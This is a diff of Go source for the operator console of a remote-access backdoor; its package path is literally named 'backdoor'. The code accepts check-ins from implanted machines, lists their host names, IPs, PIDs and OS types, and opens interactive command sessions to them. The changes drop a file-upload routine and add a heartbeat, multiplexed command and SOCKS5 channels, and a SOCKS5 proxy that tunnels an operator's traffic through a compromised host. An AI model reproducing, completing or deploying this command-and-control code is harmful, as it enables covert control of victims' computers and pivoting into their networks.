@@ -3,28 +3,53 @@ package main
 import (
 	"backdoor/util"
 	"bufio"
-	"bytes"
 	"encoding/json"
+	"flag"
 	"fmt"
+	"io"
 	"net"
 	"os"
-	"path/filepath"
 	"strings"
-	"sync/atomic"
+	"sync"
 	"time"
 )
 
+var mutex sync.Mutex
+var gs5server *Socks5Server
+
+func GetSocks5Server() *Socks5Server {
+	mutex.Lock()
+	tmp := gs5server
+	mutex.Unlock()
+	return tmp
+}
+
+func SetSocks5Server(ser *Socks5Server) {
+	mutex.Lock()
+	gs5server = ser
+	mutex.Unlock()
+}
+
 func main() {
-	if len(os.Args) != 2 {
-		fmt.Printf("Usage:%s ip:port\n", os.Args[0])
+	client := flag.String("client", "", "client listen address")
+	socks5 := flag.String("socks5", "127.0.0.1:1080", "socks5 listen address")
+	flag.Parse()
+	if len(*client) == 0 || len(*socks5) == 0 {
+		flag.Usage()
 		return
 	}
-	listener, err := net.Listen("tcp", os.Args[1])
+	clientListen, err := net.Listen("tcp", *client)
 	if err != nil {
 		fmt.Println(err)
 		return
 	}
-	go loopListen(listener)
+	socks5Listen, err := net.Listen("tcp", *socks5)
+	if err != nil {
+		fmt.Println(err)
+		return
+	}
+	go socks5Accept(socks5Listen)
+	go clientAccept(clientListen)
 	scanner := bufio.NewScanner(os.Stdin)
 	for {
 		fmt.Printf("Mgr:")
@@ -42,7 +67,7 @@ func main() {
 		}
 		if len(strarr) == 1 {
 			for _, info := range ginfomgr.All() {
-				fmt.Printf("uuid:%s host:%s ip:%s pid:%d time:%s\n", info.UUID, info.HostName, info.LocalIP, info.PID, info.Time)
+				fmt.Printf("uuid:%s host:%s ip:%s pid:%d time:%s os:%s\n", info.UUID, info.HostName, info.LocalIP, info.PID, info.Time, info.OSType)
 			}
 		} else {
 			session(strarr[1], scanner)
@@ -58,126 +83,70 @@ func session(uuid string, scanner *bufio.Scanner) {
 	fmt.Printf("waiting %s\n", uuid)
 	conn := gwait.Wait(uuid)
 	defer conn.Close()
-	cmdchan := make(chan string)
-	defer close(cmdchan)
-	var exitflag uint32
-	go read(&exitflag, conn)
-	go write(cmdchan, conn)
+	conn.Write([]byte("OK"))
 	fmt.Printf("%s come back\n", uuid)
+	pcmd := NewCmdServer(conn)
+	psocks := NewSocks5Server(conn)
+	SetSocks5Server(psocks)
+	go sessionRead(conn, pcmd, psocks)
+	go loopHeartBeat(conn)
+	pcmd.ProcUI(scanner)
+}
+
+func loopHeartBeat(conn *util.SSLConn) {
 	for {
-		if !scanner.Scan() {
+		time.Sleep(10 * time.Second)
+		_, err := conn.Write(nil)
+		if err != nil {
 			break
 		}
-		if atomic.LoadUint32(&exitflag) != 0 {
-			break
-		}
-		cmdstr := strings.TrimSpace(scanner.Text())
-		if len(cmdstr) == 0 {
-			continue
-		}
-		if cmdstr == "exit" {
-			break
-		}
-		cmdchan <- cmdstr
 	}
 }
 
-func read(exitflag *uint32, conn *util.SSLConn) {
+func sessionRead(conn *util.SSLConn, pcmd *CmdServer, psocks *Socks5Server) {
 	conn.SetReadDeadline(time.Time{})
 	for {
-		readBytes, err := conn.Read()
+		msg, err := conn.Read()
 		if err != nil {
 			break
 		}
-		if len(readBytes) != 0 {
-			fmt.Printf("%s", string(readBytes))
-		}
-	}
-	atomic.StoreUint32(exitflag, 1)
-}
-
-func write(cmdchan chan string, conn *util.SSLConn) {
-	for {
-		var timeout bool
-		var cmd string
-		var ok bool
-		select {
-		case cmd, ok = <-cmdchan:
-		case <-time.After(3 * time.Second):
-			timeout = true
-		}
-		if timeout {
-			conn.Write(nil)
+		if len(msg) == 0 {
 			continue
 		}
-		if !ok {
-			break
-		}
-		if strings.HasPrefix(cmd, "upload ") {
-			uploadFile(strings.TrimSpace(cmd[strings.Index(cmd, " "):]), conn)
-		} else {
-			var req util.Request
-			req.Cmd = cmd
-			jsonBytes, _ := json.Marshal(&req)
-			conn.Write(jsonBytes)
+		if msg[0] == util.CMD_CHANNEL {
+			pcmd.OnMsg(msg[1:])
+		} else if msg[0] == util.SOCKS5_CHANNEL {
+			psocks.OnMsg(msg[1:])
 		}
 	}
+	psocks.OnClose()
+	pcmd.OnClose()
 }
 
-func uploadFile(file string, conn *util.SSLConn) {
-	contents, err := os.ReadFile(file)
-	if err != nil {
-		fmt.Println(err)
-		return
-	}
-	if len(contents) == 0 {
-		return
-	}
-	var buffer bytes.Buffer
-	buffer.WriteString("up ")
-	buffer.WriteString(filepath.Base(file))
-	conn.Write(buffer.Bytes())
-	for beg := 0; beg < len(contents); {
-		end := beg + 2048
-		if end > len(contents) {
-			end = len(contents)
-		}
-		buffer.Reset()
-		buffer.WriteString("up ")
-		buffer.Write(contents[beg:end])
-		conn.Write(buffer.Bytes())
-		beg = end
-	}
-	buffer.Reset()
-	buffer.WriteString("up ")
-	conn.Write(buffer.Bytes())
-}
-
-func loopListen(listener net.Listener) {
+func clientAccept(clientListen net.Listener) {
 	for {
-		conn, err := listener.Accept()
+		conn, err := clientListen.Accept()
 		if err != nil {
 			continue
 		}
-		go newConn(conn)
+		go clientRead(util.NewSSLConn(conn))
 	}
 }
 
-func newConn(conn net.Conn) {
-	sslconn := util.NewSSLConn(conn)
-	sslconn.SetReadDeadline(time.Now().Add(30 * time.Second))
+func clientRead(sslconn *util.SSLConn) {
+	sslconn.SetReadDeadline(time.Now().Add(20 * time.Second))
 	infobytes, err := sslconn.Read()
 	if err != nil {
-		conn.Close()
+		sslconn.Close()
 		return
 	}
 	pinfo := new(util.Info)
 	if err := json.Unmarshal(infobytes, pinfo); err != nil {
-		conn.Close()
+		sslconn.Close()
 		return
 	}
 	if len(pinfo.LocalIP) == 0 || len(pinfo.UUID) == 0 {
-		conn.Close()
+		sslconn.Close()
 		return
 	}
 	pinfo.Time = time.Now().Format(time.RFC3339)
@@ -185,5 +154,87 @@ func newConn(conn net.Conn) {
 	if gwait.IsNeed(pinfo.UUID, sslconn) {
 		return
 	}
-	conn.Close()
+	sslconn.Close()
+}
+
+func socks5Accept(socks5Listen net.Listener) {
+	for {
+		conn, err := socks5Listen.Accept()
+		if err != nil {
+			continue
+		}
+		go socks5Read(util.NewConnWrap(conn))
+	}
+}
+
+func socks5Read(conn *util.ConnWrap) {
+	defer conn.Close()
+	var handHead [2]byte
+	if _, err := io.ReadFull(conn, handHead[:]); err != nil {
+		return
+	}
+	if handHead[0] != 5 || handHead[1] == 0 {
+		return
+	}
+	handBody := make([]byte, handHead[1])
+	if _, err := io.ReadFull(conn, handBody); err != nil {
+		return
+	}
+	conn.Write([]byte{5, 0})
+	var reqHead [4]byte
+	if _, err := io.ReadFull(conn, reqHead[:]); err != nil {
+		return
+	}
+	if reqHead[0] != 5 || reqHead[1] != 1 || reqHead[2] != 0 {
+		return
+	}
+	if reqHead[3] != 1 && reqHead[3] != 3 {
+		return
+	}
+	var reqBody []byte
+	if reqHead[3] == 1 {
+		var tmp [6]byte
+		if _, err := io.ReadFull(conn, tmp[:]); err != nil {
+			return
+		}
+		reqBody = append(reqBody, 1)
+		reqBody = append(reqBody, tmp[:]...)
+	} else {
+		var length [1]byte
+		if _, err := io.ReadFull(conn, length[:]); err != nil {
+			return
+		}
+		if length[0] == 0 {
+			return
+		}
+		tmp := make([]byte, length[0]+2)
+		if _, err := io.ReadFull(conn, tmp); err != nil {
+			return
+		}
+		reqBody = append(reqBody, 3, length[0])
+		reqBody = append(reqBody, tmp...)
+	}
+	conn.Write([]byte{0x05, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})
+	pser := GetSocks5Server()
+	if pser == nil {
+		return
+	}
+	sid, ok := pser.AddSession(conn)
+	if !ok {
+		return
+	}
+	util.SendSocksMsg(pser.conn, util.SOCKS5_CONNECT, sid, reqBody)
+	var buffer [1024]byte
+	for {
+		n, err := conn.Read(buffer[:])
+		if err != nil {
+			break
+		}
+		if n == 0 {
+			continue
+		}
+		util.SendSocksMsg(pser.conn, util.SOCKS5_DATA, sid, buffer[:n])
+	}
+	time.Sleep(20 * time.Second)
+	pser.DeleSession(sid)
 }
